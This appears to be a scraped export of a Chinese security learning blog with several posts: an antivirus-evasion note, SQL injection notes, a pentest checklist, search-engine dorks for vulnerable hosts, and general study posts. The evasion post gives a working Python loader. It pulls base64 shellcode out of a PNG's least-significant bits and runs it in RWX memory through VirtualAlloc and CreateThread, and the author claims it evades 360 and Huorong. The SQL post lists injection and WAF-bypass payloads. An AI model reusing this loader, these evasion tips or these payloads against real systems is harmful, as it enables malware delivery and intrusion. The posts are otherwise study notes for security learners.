&#39;&#39;.join([str(int(r&gt;&gt;1&lt;&lt;1!&#x3D;r))+str(int(g&gt;&gt;1&lt;&lt;1!&#x3D;g))+str(int(b&gt;&gt;1&lt;&lt;1!&#x3D;b)) for (r,g,b) in pixels]) # 提取图片中所有最低有效位中的数据\n    # 找到数据截止处的索引\n    locationDoubleNull &#x3D; binary.find(&#39;0000000000000000&#39;)\n    endIndex &#x3D; locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 !&#x3D; 0 else locationDoubleNull\n    data &#x3D; binaryToString(binary[0:endIndex])\n    return data\n\ndef isTextFile(path):\n    if path.endswith(&quot;.txt&quot;):\n        return True\n    elif path.endswith(&quot;.m&quot;):\n        return True\n    elif path.endswith(&quot;.h&quot;):\n        return True\n    elif path.endswith(&quot;.c&quot;):\n        return True\n    elif path.endswith(&quot;.py&quot;):\n        return True\n    else:\n        return False\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    &quot;&quot;&quot;command-line interface&quot;&quot;&quot;\n    arguments &#x3D; docopt(__doc__)\n#    print(arguments)\n\n    if arguments[&#39;-e&#39;] or arguments[&#39;encode&#39;]:\n        if arguments[&#39;&lt;text&gt;&#39;] is None:\n            arguments[&#39;&lt;text&gt;&#39;] &#x3D; &quot;待加密的文本&quot;\n        if arguments[&#39;&lt;encodedImage&gt;&#39;] is None:\n            arguments[&#39;&lt;encodedImage&gt;&#39;] &#x3D; &quot;encodedImage.png&quot;\n\n        if isTextFile(arguments[&#39;&lt;text&gt;&#39;]):\n            with open(arguments[&#39;&lt;text&gt;&#39;], &#39;rt&#39;) as f:\n                arguments[&#39;&lt;text&gt;&#39;] &#x3D; f.read()\n\n        print(&quot;载体图片:&quot;)\n        print(arguments[&#39;&lt;originImage&gt;&#39;]+&quot;\\n&quot;)\n        print(&quot;待加密密文:&quot;)\n        print(arguments[&#39;&lt;text&gt;&#39;]+&quot;\\n&quot;)\n        print(&quot;加密后图片:&quot;)\n        print(arguments[&#39;&lt;encodedImage&gt;&#39;]+&quot;\\n&quot;)\n        print(&quot;加密中……\\n&quot;)\n        im &#x3D; Image.open(arguments[&#39;&lt;originImage&gt;&#39;])\n        if im.mode &#x3D;&#x3D; &#39;RGBA&#39;:\n            RGBAencodeDataInImage(im, arguments[&#39;&lt;text&gt;&#39;]).save(arguments[&#39;&lt;encodedImage&gt;&#39;])\n        # elif im.mode &#x3D;&#x3D; &#39;RGB&#39;:\n        #     RGBencodeDataInImage(im, arguments[&#39;&lt;text&gt;&#39;]).save(arguments[&#39;&lt;encodedImage&gt;&#39;])\n        else:\n            print(&quot;暂不支持此图片格式……&quot;)\n\n        print(&quot;加密完成,密文为：\\n&quot;+arguments[&#39;&lt;text&gt;&#39;]+&quot;\\n&quot;)\n    elif arguments[&#39;-d&#39;] or arguments[&#39;decode&#39;]:\n        print(&quot;解密中……\\n&quot;)\n        im &#x3D; Image.open(arguments[&#39;&lt;encodedImage&gt;&#39;])\n        if im.mode &#x3D;&#x3D; &#39;RGBA&#39;:\n            print(&quot;解秘完成，密文为：\\n&quot;+RGBAdecodeImage(im)+&quot;\\n&quot;)\n        # elif im.mode &#x3D;&#x3D; &#39;RGB&#39;:\n        #     print(&quot;解秘完成，密文为：\\n&quot;+RGBdecodeImage(im)+&quot;\\n&quot;)\n        else:\n            print(&quot;非法的图片格式……&quot;)\n\n使用：xx.py -e 被写入图片.PNG  写入内容\n解密执行python文件\n#!&#x2F;usr&#x2F;bin&#x2F;env python3\n#coding&#x3D;utf-8\n\n&quot;&quot;&quot;Encode png image via command-line.\n\nUsage:\n    imageEncoding (-e|encode) &lt;originImage&gt; [&lt;text&gt;] [&lt;encodedImage&gt;]\n    imageEncoding (-d|decode) &lt;encodedImage&gt;\n\nOptions:\n    -h,--help   显示帮助菜单\n    -e          加密\n    -d          解密\n\nExample:\n    imageEncoding -e coffee.png hello textOrFileToEncode encodedImage.png\n    imageEncoding -d encodedImage.png\n&quot;&quot;&quot;\n\nfrom PIL import Image\nfrom docopt import docopt\nimport base64,ctypes\n\n\n\n&quot;&quot;&quot;\n内置函数 bin() 的替代，返回固定长度的二进制字符串\n&quot;&quot;&quot;\ndef constLenBin(int):\n    binary &#x3D; &quot;0&quot;*(8-(len(bin(int))-2))+bin(int).replace(&#39;0b&#39;,&#39;&#39;)  # 去掉 bin() 返回的二进制字符串中的 &#39;0b&#39;，并在左边补足 &#39;0&#39; 直到字符串长度为 8\n    return binary\n\n&quot;&quot;&quot;\n将字符串编码到图片中\n&quot;&quot;&quot;\n\n\n&quot;&quot;&quot;\n从二进制字符串转为 UTF-8 字符串\n&quot;&quot;&quot;\ndef binaryToString(binary):\n    index &#x3D; 0\n    string &#x3D; []\n    rec &#x3D; lambda x, i: x[2:8] + (rec(x[8:], i-1) if i &gt; 1 else &#39;&#39;) if x else &#39;&#39;\n    # rec &#x3D; lambda x, i: x and (x[2:8] + (i &gt; 1 and rec(x[8:], i-1) or &#39;&#39;)) or &#39;&#39;\n    fun &#x3D; lambda x, i: x[i+1:8] + rec(x[8:], i-1)\n    while index + 1 &lt; len(binary):\n        chartype &#x3D; binary[index:].index(&#39;0&#39;) # 存放字符所占字节数，一个字节的字符会存为 0\n        length &#x3D; chartype*8 if chartype else 8\n        string.append(chr(int(fun(binary[index:index+length],chartype),2)))\n        index +&#x3D; length\n    return &#39;&#39;.join(string)\n\n&quot;&quot;&quot;\n解码隐藏数据\n&quot;&quot;&quot;\ndef RGBAdecodeImage(image):\n    pixels &#x3D; list(image.getdata())  # 获得像素列表\n    binary &#x3D; &#39;&#39;.join([str(int(r&gt;&gt;1&lt;&lt;1!&#x3D;r))+str(int(g&gt;&gt;1&lt;&lt;1!&#x3D;g))+str(int(b&gt;&gt;1&lt;&lt;1!&#x3D;b))+str(int(t&gt;&gt;1&lt;&lt;1!&#x3D;t)) for (r,g,b,t) in pixels]) # 提取图片中所有最低有效位中的数据\n    # 找到数据截止处的索引\n    locationDoubleNull &#x3D; binary.find(&#39;0000000000000000&#39;)\n    endIndex &#x3D; locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 !&#x3D; 0 else locationDoubleNull\n    data &#x3D; binaryToString(binary[0:endIndex])\n    return data\n\ndef RGBdecodeImage(image):\n    pixels &#x3D; list(image.getdata())  # 获得像素列表\n    binary &#x3D; &#39;&#39;.join([str(int(r&gt;&gt;1&lt;&lt;1!&#x3D;r))+str(int(g&gt;&gt;1&lt;&lt;1!&#x3D;g))+str(int(b&gt;&gt;1&lt;&lt;1!&#x3D;b)) for (r,g,b) in pixels]) # 提取图片中所有最低有效位中的数据\n    # 找到数据截止处的索引\n    locationDoubleNull &#x3D; binary.find(&#39;0000000000000000&#39;)\n    endIndex &#x3D; locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 !&#x3D; 0 else locationDoubleNull\n    data &#x3D; binaryToString(binary[0:endIndex])\n    return data\n\ndef isTextFile(path):\n    if path.endswith(&quot;.txt&quot;):\n        return True\n    elif path.endswith(&quot;.m&quot;):\n        return True\n    elif path.endswith(&quot;.h&quot;):\n        return True\n    elif path.endswith(&quot;.c&quot;):\n        return True\n    elif path.endswith(&quot;.py&quot;):\n        return True\n    else:\n        return False\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    &quot;&quot;&quot;command-line interface&quot;&quot;&quot;\n    #arguments &#x3D; docopt(__doc__)\n    im &#x3D; Image.open(&#39;encodedImage.png&#39;)\n    print(&quot;解秘完成，密文为：\\n&quot;+RGBAdecodeImage(im)+&quot;\\n&quot;)\n    func&#x3D;base64.b64decode(RGBAdecodeImage(im))\n    rwxpage &#x3D; ctypes.windll.kernel32.VirtualAlloc(0, len(func), 0x1000, 0x40)\n    ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(func), len(func))\n    handle &#x3D; ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)\n    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)\n\n加密完成会自动生成加密图片文件，解密加载脚本运行会自动获取文件夹内的加密图片文件，直接运行解密脚本上线\n坑点：上面的文本提取有一个坑点，就是需要使用exec执行函数，这样360是过不了的\n其中使用http远程加载，火绒是完全不会报毒，正常上线\n使用py2exe打包socket之后，运行程序360不会报毒，但是客户端发送加密shellcode就会直接被杀\n其他则是直接被杀，360果然还是挺强的\n其他思路就是用不同方式请求获取shellcode\n如：获取app数据，获取oss页面数据，获取cdn数据，还有就是利用白名单，将shellcode放到一些可能是白名单的网站上像阿里云，百度等等的大公司的业务上面，只要能获取就行。\n入门学习笔记，想通过审核进论坛看文章，别喷我！！！\n","slug":"python免杀-小迪笔记","date":"2022-08-17T09:26:05.000Z","categories_index":"python","tags_index":"免杀","author_index":"Longw"},{"id":"96816457e24e5ee2d74dc29d18ce444d","title":"SQL注入2","content":"\n\n补补基础，理解注入，记下学习笔记\nSQL注入数字型无需闭合单引号\n字符型闭合语句进行注入\n注入测试流程判断注入点注入类型获取信息函数user() database() version()  @@hostname   @@datadir  @@version_compile_os\nschema() connection_id() system_user()\tsession_user()\tcurrent_user() current_user\nsuser_name() user_name() db_name() is_member(&#39;db_owner&#39;) #判断数据库角色 \nconvert(int,&#39;5&#39;) #类型转换 stuff Getdata \n\n有回显\n报错注入：\n?id&#x3D;1 and updatexml(2,concat(0x7e,database(),0x7e),1)\n\n?id&#x3D;1 and extractvalue(1,concat(0x7e,database(),0x7e))\n\n?id&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+   #获取数据库\n\n?id&#x3D;1&#39; and exp(~(select * from (select user())a))   #必须按照这个模式来，mysql是大于709\n\n利用报错注入获取信息时，信息条数最好限定，limit 0,1\nunion注入：\norder by判断字段数\nuinon select 1,2,3...     #找回显点\nunion select 1,user(),3...   #利用回显点\n\nunion注入，需要前面的语句错误，前后字段相同，默认去掉重复，union all不去除重复\n\n无回显\n布尔盲注\n利用true和false判断\nand (left(database(),1)&#x3D;&#39;s&#39;)   #判断数据库名的第一个字符\n\nand (ascii(substr(database(),1,1))&#x3D;97)  #用ascii判断\n\nand (length(database())&#x3D;5)   #利用length判断\n\n一般来说使用&gt;  &lt; 来判断范围，之后再判断具体数据\n延时注入\nselect benchark(1000,select * from user)   #mysql&lt;5.0,执行1000查询语句，尤其注意可能会导致数据库崩溃\n\nand sleep(5)   #直接测试能否执行\n\nand if(length(database())&gt;4,sleep(5),0)   #database&gt;4,则睡眠五秒\n\nand if(substring(user(),1,4)&#x3D;&#39;root&#39;,sleep(5),1)  #判断当前用户\n   \nand if(MID(version(),1,1)like 5,sleep(5),1)   #判断数据库版本\n\nand if(ascii(substring(database(),1,4))&gt;97,sleep(5),1)   #判断数据库名\n\n上面加了一些函数的用法，以达到获取信息\n\n二次注入二次注入的使用是将语句带入数据库，在另外一个地方查询数据库信息时，执行该语句，返回执行结果\n比如：\n在注册用户时，将用户名设置为 aaa&#39; order by 7%23\n在另外查询用户数据的地方，存在带入查询，就会执行该语句\n之后不断修改用户名，再不断查询用户名返回结果，达到注入目的\n\n宽字节注入在数据库使用GBK、GB18030、BIG5等编码时，可能存在宽字节注入\n在注入点使用了addslashes()等转义单引号，如：\n?id&#x3D;1&#39;   返回 id&#x3D;1\\&#39;\n\\在宽字节中编码为%5c,使用%df，则会将其转化为繁体字，从而绕过了单引号过滤\n?id&#x3D;1%df&#39;   这样进行注入\n\n其他特殊注入cookie注入\n\nxff头注入\n\nxml实体注入\n\n伪静态注入：\n在F12控制台输入：javascript:alert(document.lastModified)\n回车弹框时间，然后等几秒再来一次，查看时间是否和上次的相同，如果相同就证明是静态的，如果时间和上次不同，则是伪静态的网站   #https:&#x2F;&#x2F;blog.csdn.net&#x2F;p_utao&#x2F;article&#x2F;details&#x2F;108654640\n\n等等，大差不差\n\nAccess偏移注入：知道了表名，不知道字段的时候\n1.判断字段数 order by\n2.判断表名  使用union select * from 表名,如admin\n3.偏移注入  利用公式注入\n?id&#x3D;1+union+select+1,2,3,4,5,6,7,8,9+from+admin\n?id&#x3D;1+union+select+1,2,3,4,5,*+from+admin  \n#一个一个测试，到5用*号代替显示正常，利用公式\n9-5&#x3D;4;9-4*2&#x3D;1;则从1之后开始\n当前admin表中字段数就为4；\n?id&#x3D;1+union+select+1,a.id,b.id,*+from+(admin+as+a+inner+join+admin+as+b+on+a.id&#x3D;b.id)\n\nWAF绕过常用的：\nor–+2&#x3D;!!!2 类假!!!2为真的结果，利用不变逻辑的!!!替代空格\n注释替代 and&#x2F;&#x2F;select&#x2F;&#x2F;uname&#x2F;&#x2F;from&#x2F;&#x2F;users\n+号连接字符替换\n大小写、双写、AND&#x2F;&amp;&amp;,OR&#x2F;||、&#x2F;*!xxx*&#x2F;、&#x2F;**&#x2F;、url编码、base64编码\n\n空格替换：\n%0a  新建一行\n%09  TAB键（水平）\n%0d  return功能\n%0b  TAB键（垂直）\n%0c  新建一页\n%20  就是空格\nhex编码\n\nemoji绕waf\n脏数据绕waf\n畸形协议绕过,该post为上传，burp一键切换\n替换常用的可能被waf屏蔽的函数\n\nCVE-2022-34265   Django  sql注入漏洞复现使用vulhub环境\ndocker-compose up -d   #启动环境\n\ndocker ps    #查看服务端口\n\ndocker-compose down -v  #关闭环境，为啥，第二次使用不用下载直接启动\n\n访问IP:8000\n","slug":"SQL注入2","date":"2022-07-15T12:05:32.000Z","categories_index":"安全漏洞基础","tags_index":"owasp TOP 10","author_index":"Longw"},{"id":"a208cc555303d3d7e79b97f2e2214046","title":"Hack如何学习","content":"InsiderPhD的HACK如何学习笔记关于各种人员学习hack​            找漏洞不要想着只学ctf，这就是学习用的，很难转化为实战。比如说找个xss，你用ctf的payload很难在现实找到，因为大多数厂家都会防御这种攻击。\n​           从ctf转化为实战从来不是一件简单的事情。\n​           你应该学习理论，实战和ctf互相转化。以巩固学习经验。\n​           你应该尝试hack，不管你会或者是不会，你都可以去尝试，这是一个非常好的开始。\n​           同样，学习hack，请开始学习一门编程语言，她推荐她喜欢的php，因为php真的很简单。当你学习php并且完成一个项目后，你可以尝试攻击这个项目。你在学习php做项目的时候，会学习如何防止sql注入，如何过滤xss。当你尝试hack你的项目，并且成功后，你就能将他们结合起来。互相提升。然后你可以尝试学习ctf。这样能让你知道别人在这方面的思路。之后，你可以不断阅读和不断尝试hack。并且推荐你不断进行这两步。\n​          如果还在学校，学习学校提供的便宜的安全课程。还有参加当地的hack聚会，参与学校hack俱乐部等等。\n​          如果你是一位有技术的人，你可以尝试真实的hack一个目标，这样能让你沉浸在真实的hack过程中，而不是不断地学习各种知识。\n​          如果你实在没有时间，你可以参与在线社区之类的。\n​          如果你是一名开发人员，拥有编程经验，十分推荐你从owasp top 10开始学习。然后阅读一些关于你学习的语言方面的文章。比如，你是php开发者，你可以尝试一些包含漏洞。这能让你从理论转化为实战，特别是当你已经拥有防御漏洞的知识。之后，你在阅读常用书籍的时候可以尝试ctf练习，因为你拥有开发经验你更容易理解他们是如何构建的。\n​          如果你在安全方面已经拥有了很多知识，但是你更擅长防御。那么你可以尝试阅读攻击者在某一方面的攻击文章。他们一般擅长攻击而不是如何安全防御。\n​         如果你是一名工程师之类的人员，你更加擅长硬件方面的知识，对于软件了解较少。你可以从初学者学起，可以在学习过程中跳过你已经会的内容。这样可以快速填补你的空白方面，之后你可以尝试真实攻击目标。\n​        最想推荐的就是，你要尝试真实攻击目标，因为这是你学习的目标。建议尽快到达这一步。还有，永远不要停止学习。尽管你可能成功，拥有一个或者多个bug。当你拥有这些后，你可能会感到无聊，甚至感觉自己还是一个初学者，这时候你就要尝试加入一些社区。社区在学习方面很不错，特别是当你还是一个初学者。可以尝试借鉴他人hack的经验。并且与比你技术更好的人交朋友。这样可以拓展业务，也可以帮助你发展你的整体技能。之后，你就可以尝试分享你的知识，帮助和以前的你一样的初学者。\n​        最推荐的资源就是hack会议。不管你对这方面是什么意见。你要像学习科学论文知识一样思考他们为何这样做。这样学习他人的想法能帮助你拓展思维。你拥有你自己独特的眼光来看待世界，同样你拥有自己独特的方法去hack。\n​       ctf入门社区：https://ctf.hacker101.com/\n​       入门靶场：http://www.dvwa.co.uk/\n​       OWASP：https://owasp.org/www-project-juice-shop/\n​       完整的渗透测试学习：https://www.youtube.com/watch?v=WnN6dbos5u8&amp;t=0s  （有相关作业，学完就是完整的初级）\n","slug":"Hack如何学习","date":"2022-04-04T15:04:49.000Z","categories_index":"","tags_index":"hack学习","author_index":"Longw"},{"id":"bc7db7781838613256ae7ac419cf7231","title":"渗透测试工作流程:checklist","content":"\n\n由来最近看p牛直播讲他学习安全的路程和经验（p牛大家都应该认识）。其中也讲到了渗透测试的经验，他说不好弄是很正常的，手忙脚乱也是很正常的。因为我们没有将渗透测试流程化，表单化。我们在现场时，也许不能完整的进行测试。往往在扫描工具没找到重要漏洞、手测一般漏洞也没有找到问题时就找不到方向了。\n所以，将渗透测试流程化，表单化。方便我们在一时没找到头绪是也能将流程做下去，不至于发呆😐懵逼。\n实习了应该两个月了。从一开始的什么都不清楚，到现在有了一点经验。反正就是及时总结吧！\n常见渗透测试漏洞现在总结一下我在进行渗透测试时遇到最多的漏洞。\n\n弱口令\n明文传输\n越权\n反射xss\n\n这些就是我在两个月实习过程的成果，这么一点点问题。\nchecklist（我现在还是菜鸟，流程还不是总结很好，后面会一直更新的）感谢组里老大Rain提供的流程黑盒测试漏洞扫描遇事不决，先扫一波1. 对于网站使用awvs或是appscan，我习惯awvs，还有Netsparker。最好都来一发看看。\n2. 对于主机，使用Nessus，配合插件。\n3. 还有使用goby，好处就是各种插件，就方便了。\n4. 最近出了个qingscan的集成扫描器。可以去GitHub上找到，最好安装到服务器里面，到时候就能让团队成员一起使用了。\n\n 先挂在那边扫着，等等看成果。\n结果验证这个不用讲了，就是将漏洞扫描的结果去验证一下。运气好直接能getshell了。\n经验漏洞这个就看你经验了，就是你以前遇到过或者你知道有这个漏洞。那不就直接验证先吗？像常见oa系统漏洞，常见越权漏洞等等。\n还有就是多多复现漏洞，多多将各种常见的poc在靶场和实战利用利用。\n信息收集直接给后台也要信息收集，对于公布在网络上的系统可以进行正常流程信息收集。对于内网，专网那就找接口信息泄露，推荐一个插件FindSomething。\n找各种js的泄露接口，发包查看返回内容。\n这个可以等后面的测完在慢慢找。\n信息收集的完整流程可以看看这篇，写的比我全：https://blog.zjun.info/2022/web-penetration-information-collection-checklist.html#\n扫描路径\ndirsearch \n\ndirmap\n可能会找到一点惊喜，最好是找到一些敏感路径就在那个路径下再次扫描一波，这样更加全面。\n\n御剑后台扫描\n\n\n抓包分析明文传输单位一般给后台，直接测试一下就行了。\n弱口令后台测试，开始先自己手测一下，看看效果和能不能爆破。\n能爆破就burp抓包爆破。\n测试账号未删除网站编写测试时用到的账号，一般为13333333333这种的。\n短信轰炸还有登录页面是短信登录就可以测试短信轰炸\n还有一个小点，有的单位甚至短信验证码直接都不改的。来两次看看，要是不变这不就可以爆破账号了。\n登录页面Xss这个就不用讲了，看见框就插一波。登录页面抓包后，看提交的参数，每个参数都给他插一遍。\n怕麻烦就用工具，或者是将常用的测试Xss总结起来，用burp直接爆。\n登陆页面sql注入常见的，在账号框内输入\nadmin&#39; or 1&#x3D;1#\nadmin&#39; or 1&#x3D;1 --+\nadmin&#39;) or 1&#x3D;1 --+\nadmin&#39;) or 1&#x3D;1 #\n\n这个可以总结一下各种闭合绕过形成字典，直接burp设置payload爆破测试。\n登录绕过比如修改登录返回包参数，在客户端这边直接登录后台。\n任意注册应该是有些不对外开放的平台，能随意注册导致泄露平台中的一些敏感信息之类的问题。\n框架/组件/插件漏洞常见的\njeecgboot未授权\n\ndruid后台\n\nspring boot\n\nswagger接口未授权\n等等\n\n\n越权测试所有查询点越权观察查询点是否使用token，尝试逆向\n所有操作点越权管理账号cookie和普通账号cookie测试\n正常漏洞测试sql注入payload看以前的sql注入总结\n[]: https://longwblog.com/post/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93\nsqlmap使用\nXss看见框就插试试看，留言、评论都可以试试\n当然，要在授权允许的情况下进行。\n也是有工具测试的\n文件上传就上传绕过测试\n命令执行得找到命令执行的功能点，在测试\nCSRF一般与xss结合，诱人点击执行。\nXXE等队友补充\nSSRF服务端请求伪造等队友补充\n文件包含这个真的不常见\n逻辑漏洞像订单金额修改，简单验证码之类的。一般使用弱伪随机数。\n其实上面的真要测试也是挺复杂的，每个地方的测试的话肯定要花一定的时间。但是因为常见，又是入门学习的漏洞所以简单写一下。\n当然，在信息收集过程若是遇到系统版本号之类的，可以去查一下对应版本的已知漏洞及对应的poc。","slug":"渗透测试工作流程-checklist","date":"2022-01-17T02:26:04.000Z","categories_index":"总结","tags_index":"总结","author_index":"Longw"},{"id":"dbfc96a8c057ede6b7efcb26a6039a2e","title":"利用网络空间测绘挖洞","content":"\n\n网络测绘空间信息安全发展到现在，各种辅助工具不断地跟新换代。其中对我们最重要的除了burp那几样之外，就是这个网络测绘空间了。他的定义直接百度就行了，这次学习的是如何使用他为我们在进行渗透测试和漏洞挖掘。\n在如今年代，他在渗透测试和漏洞挖掘方面甚至比Google等搜索引擎更加强大。他有固定的语法能让我们直接找到安装对应应用的系统主机。方便我们在找到0day去批量找对应系统或是验证某些刚刚公布的漏洞。\n常用的网络测绘空间国内以前最著名的就是fofa了，不得不说以前在国内绝对可以算是最强。但是最近新出了一个360的网络测绘空间。在实战找漏洞方面，我亲测比fofa好用一点。\n原因有很多，最主要有一个fofa需要会员。这个其实也不算大问题。但是嘛！同样的语法360搜索的内容是fofa的好几倍。这样我们的测试面就广了，找到有漏洞系统的机会也就多了。\nfofa：https://fofa.so\n360：https://quake.360.cn\n钟馗之眼：https://www.zoomeye.org\n这几家就是国内常见的网络测绘空间。\nfofa语句（来自csdn：NoOne_52）Apache Flink未授权访问+远程代码命令执行\n\napp&#x3D;&quot;APACHE-Flink&quot; &amp;&amp; country&#x3D;&quot;CN&quot;\nApache-Shiro\n\n\napp&#x3D;&quot;Apache-Shiro&quot;\n\n\n威胁情报-挖矿啥的\nbody&#x3D;&quot;miner.start(&quot;&amp;&amp;header!&#x3D;&quot;Mikrotik HttpProxy&quot;&amp;&amp;country&#x3D;CN\n\n目录遍历\nbody&#x3D;&quot;miner.start(&quot;&amp;&amp;header!&#x3D;&quot;Mikrotik HttpProxy&quot;&amp;&amp;country&#x3D;CN\n\n回手掏之目录遍历\nbody&#x3D;&quot;Directory listing for&quot;||title&#x3D;&quot;index of &#x2F;&quot;||body&#x3D;&quot;转到父目录&quot;\n\nxxl-job-admin漏洞系列，如很早的弱口令和后台计划弹shll\n(body&#x3D;&quot;xxl-job-admin&quot;||body&#x3D;&quot;&lt;a&gt;&lt;b&gt;XXL&lt;&#x2F;b&gt;JOB&lt;&#x2F;a&gt;&quot;)&amp;&amp;body&#x3D;&quot;任务调度中心&quot;\n\n\nAdobe ColdFusion跨站脚本漏洞\napp&#x3D;&quot;Adobe-ColdFusion&quot;\n\nApache Solr远程代码执行漏洞\napp&#x3D;&quot;Solr&quot;\n\nCVE-2019-17558 Apache Solr Velocity模板远程代码执行\nheader&#x3D;“rememberme&#x3D;deleteMe”、header&#x3D;“shiroCookie”\n\nWeblogic\n(app&#x3D;&quot;BEA-WebLogic-Server&quot; || app&#x3D;&quot;Weblogic_interface_7001&quot;) &amp;&amp; country&#x3D;&quot;CN&quot;\n\n深信服VPN远程代码执行（2019 攻防演练）\nheader&#x3D;&quot;Set-Cookie: TWFID&#x3D;&quot;\n\ntitle&#x3D;&quot;Whoops!&quot; &amp;&amp; country&#x3D;&quot;CN&quot;\n\ntitle&#x3D;”abc”  \nheader&#x3D;”abc” \nbody&#x3D;”abc” \ndomain&#x3D;”xx.com” \nhost&#x3D;”.xx.cn” \nport&#x3D;”443”    \nip&#x3D;”1.1.1.1” \nprotocol&#x3D;”https” \ncity&#x3D;”Beijing” \nregion&#x3D;”Zhejiang” \ncountry&#x3D;”CN” \ncert&#x3D;”xx.com” \nip&#x3D;&quot;111.1.1.1&#x2F;8&quot;\n\nip&#x3D;&quot;111.1.1.1&#x2F;16&quot;\n\nip&#x3D;&quot;111.1.1.1&#x2F;24&quot;\n\nports&#x3D;&quot;3306,443,22&quot;  搜索同时开启3306端口、443端口和22端口的IP\nports&#x3D;&#x3D;&quot;3306,443,22&quot;  搜索只开启3306端口、443端口和22端口的IP\n\n原文链接：https://blog.csdn.net/weixin_45682070/article/details/109546750\n这些语句应该都是通用的，这样在几家同时找一下。看看搜索结果对比一下就知道谁的搜集范围更加普遍。\n验证当然，再找到对应版本的资产后。我们也要知道对应的poc，这样方便我们进行利用。以前在网上有公布的免费poc库，但是现在给关闭了。所以就需要你们发挥自己的大脑去网上找了。当然，最好是自建一个poc网站。自用能找到就行，但是如果是团队，还是建个内部poc库方便一点。毕竟这样方便及时更新poc库，人多总是力量大的。\n","slug":"利用网络空间测绘挖洞","date":"2022-01-13T11:07:43.000Z","categories_index":"安全漏洞基础","tags_index":"实战","author_index":"Longw"},{"id":"6ba198a2b679996222b6a9277b704dc9","title":"实习小结","content":"\n\n实习都一个半月了，小结一下吧！\n真的就像b站那位红队大佬讲的那样，学的也不算太少但是还是什么都干不了。可是学会了和没学会是不同的概念，即便学会之后忘了。\n半个月时间，渗透测试方面也看了许多文章，学了很多的技巧。在fofa上找对应的网站测试也是行的。但是吧，我实习是干等保的。只能对给的网站下手，以为能秒天秒地秒空气的随便日进内网。结果却发现你除了用工具扫描之后复现一下，查一查接口有没有未授权基本上什么都干不了。\n\n菜的扣脚啊！还好最近发现了那位up主。听他传授经验才发现大家都是一样的。\n还是得找准方向。虽然最近没学习代码语言方面的知识。但是一直在学习等级保护测评师的教材，也算是对这份工作有了深入的了解了。毕竟这是实习考核啊！过不了得滚蛋！！！先把这个努力学好，再对其他方面的努力学习吧。\n最近的学习有了框架，感觉对测评方面打下了不错的基础。学东西也渐渐快了起来，也可以对新人说说要理解着学习了！\n知道了自己的水平，找准自己感兴趣的方向，然后努力往那个方向前进。\n后面除了测评内容，还需要学习php和java代码审计，然后是对脚本编写方面深入学习一下。还有平时要不断学习各种常见的漏洞，学会他们的打法。最后就是多多总结关键点，形成自己的风格。\n\n","slug":"实习小结","date":"2022-01-09T04:46:21.000Z","categories_index":"总结","tags_index":"总结","author_index":"Longw"},{"id":"31f05bcb8807c536b785c3c2b7399b78","title":"java版本切换","content":"\n\nJDK版本切换我们在进行渗透测试时会用到许许多多的工具，一般的工具需要Java8而有的工具如最新版burp则需要Java11版本。这时候就需要进行JDK的版本切换。\nWindows下的JDK版本切换以JDK8和JDK11为例。我们在官网分别下载好安装包。先安装Java8，默认安装路径在C盘。一直确定就行了。安装完成后配置环境变量，网上一堆教程，这边还是讲一下吧。\n以win10为例，右击此电脑，选择属性，选择右边的高级系统设置。\n选择环境变量，之后可以选择在user或是系统变量两者反正网上两个都加了。分别点击新建。进行如下操作：\n\n\n之后我们，进入系统变量的path中。点击新建，如果java默认安装在C盘则是这个路径：\nC:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath\n\n然后一直确定，就ok了。\n之后我们打开cmd，输入：\njava -verion \n\n\njavac -version\n\n\n当看都如图所示结果，则代表我们的Java8已经完美安装成功了。\n之后直接安装Java11。双击安装包，将安装路径的默认C盘改为D盘。其它就一直确定就行了。\n一定一个C盘一个D盘，如果都在C盘会发生路径重复之类的事情，反正非常麻烦。\n切换版本进入主题，当安装完成后如何切换版本。目前在网上看到的自动化切换脚本都不是太行。\n那就只能手动切换了。完美将Java8的安装路径和Java11的安装路径分别记录到一个txt文本中。\n按照配置环境变量的过程。打开环境变量后，将前面设置好的JAVA_HOME分别进行修改，将路径改为Java11的路径。用户变量和系统变量同时修改。之后修改系统变量中的path，找到Java那一行，将前面设置的C盘路径修改为D盘路径。\nC:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath\n修改为\nD:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath\n\n之后我们一直确定就行。\n完成后，打开cmd。输入：\nJava -version\n\n\njavac -verison\n\n\n将看到如图所示结果，表明我们的JDK版本已经修改完成了。\n记住一定要两个命令结果都显示同一版本才行，不然又会发生一些难以理解的问题。还有每次切换完要重新打开cmd才行。不然你看到的还是原来的版本。\nLinux下JDK版本切换这个网上教程一堆，以后有机会在记录。\n\n","slug":"java版本切换","date":"2021-11-26T06:48:05.000Z","categories_index":"Java版本切换","tags_index":"Java","author_index":"Longw"},{"id":"1b77ba18c55109a4d53f945700a7bb03","title":"信息收集流程","content":"\n\n信息收集的重要性简单说，你能不能挖到东西。能不能多挖东西，就看你信息收集的程度。\nwhois信息收集拿到对方网站域名，在站长之家或是在kali中进行whois查询。\nkali中直接\nwhois &lt;域名&gt;    \n如果返回的是英文，那可以直接百度翻译或是谷歌翻译。\n\n嫌麻烦可以直接站长之家进行查询：http://whois.chinaz.com/\n还有这些：https://whois.aliyun.com/ 、 https://www.whois365.com/cn/、 https://whois.aizhan.com/ \n子域名信息收集有时候主域名很难搞，就可以从子域名下手。\n1、子域名挖掘工具 如：Maltego CE、wydomain、subDomainsBrute、dnsmaper、Layer子域名挖掘机。\n2、搜索引擎挖掘 如： 在Google中输入 site:sina.com\n3、第三方网站查询：http://tool.chinaz.com/subdomain、https://dnsdumpster.com/\n4、证书透明度公开日志枚举：https://crt.sh/ 、http://censys.io/\n5、其他途径：https://phpinfo.me/domain 